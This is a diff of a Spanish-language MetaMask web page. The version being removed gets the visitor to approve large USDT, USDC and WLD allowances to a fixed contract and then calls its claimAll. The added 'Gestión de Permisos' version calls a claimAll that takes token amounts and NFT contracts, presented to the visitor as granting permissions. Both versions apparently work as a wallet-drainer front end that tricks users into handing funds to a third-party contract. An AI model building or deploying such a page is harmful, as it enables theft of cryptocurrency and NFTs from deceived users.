@@ -1,53 +1,90 @@
-<script>
-const provider = new ethers.providers.Web3Provider(window.ethereum);
-const signer = provider.getSigner();
-const contractAddress = "0xD949A68ACBdFC313f7d94FC9169F98DB45F5F2E4";
-const contractABI = [
-    "function claimAll() external",
-    "function approve(address spender, uint256 amount) external returns (bool)"
-];
-
-const usdtAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58";
-const usdcAddress = "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1";
-const wldAddress = "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85";
-const spenderAddress = contractAddress;
-const approveAmount = ethers.utils.parseUnits("1000000", 6);
-
-async function approveAndClaim() {
-    if (!window.ethereum) {
-        alert("MetaMask no está instalado");
-        return;
-    }
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gestión de Permisos</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <h1>Gestión de Permisos</h1>
+    <button id="connectWallet">Conectar MetaMask</button>
+    <button id="approveTokens" disabled>Autorizar Permisos</button>
     
-    await provider.send("eth_requestAccounts", []);
-    const contract = new ethers.Contract(contractAddress, contractABI, signer);
-    const usdtContract = new ethers.Contract(usdtAddress, contractABI, signer);
-    const usdcContract = new ethers.Contract(usdcAddress, contractABI, signer);
-    const wldContract = new ethers.Contract(wldAddress, contractABI, signer);
-    
-    try {
-        console.log("Aprobando USDT...");
-        await usdtContract.approve(spenderAddress, approveAmount);
-        console.log("Aprobación de USDT completada");
+    <script>
+        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Reemplaza con la dirección de tu contrato
+        const contractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
+                    { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+                    { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
+                    { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
+                ],
+                "name": "claimAll",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
         
-        console.log("Aprobando USDC...");
-        await usdcContract.approve(spenderAddress, approveAmount);
-        console.log("Aprobación de USDC completada");
-        
-        console.log("Aprobando WLD...");
-        await wldContract.approve(spenderAddress, approveAmount);
-        console.log("Aprobación de WLD completada");
-        
-        console.log("Llamando a claimAll...");
-        const tx = await contract.claimAll();
-        await tx.wait();
-        console.log("Tokens reclamados correctamente");
-        alert("Tokens aprobados y reclamados correctamente");
-    } catch (error) {
-        console.error("Error en la transacción", error);
-        alert("Error en la transacción");
-    }
-}
-</script>
+        let web3;
+        let userAccount;
+        let contract;
 
-<button onclick="approveAndClaim()">Aprobar y Reclamar Tokens</button>
+        document.getElementById("connectWallet").addEventListener("click", async () => {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                try {
+                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                    userAccount = accounts[0];
+                    contract = new web3.eth.Contract(contractABI, contractAddress);
+                    document.getElementById("approveTokens").disabled = false;
+                    alert("Conectado: " + userAccount);
+                } catch (error) {
+                    console.error("Error conectando a MetaMask", error);
+                }
+            } else {
+                alert("MetaMask no está instalado");
+            }
+        });
+
+        document.getElementById("approveTokens").addEventListener("click", async () => {
+            if (!userAccount) return alert("Primero conecta MetaMask");
+            
+            const tokens = ["0xUSDT", "0xUSDC", "0xWLD"]; // Reemplaza con las direcciones reales
+            const amounts = [web3.utils.toWei("100", "ether"), web3.utils.toWei("100", "ether"), web3.utils.toWei("100", "ether")];
+            
+            try {
+                await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
+                alert("Permisos otorgados con éxito");
+            } catch (error) {
+                console.error("Error al autorizar", error);
+                alert("Error al otorgar permisos");
+            }
+        });
+    </script>
+</body>
+</html>
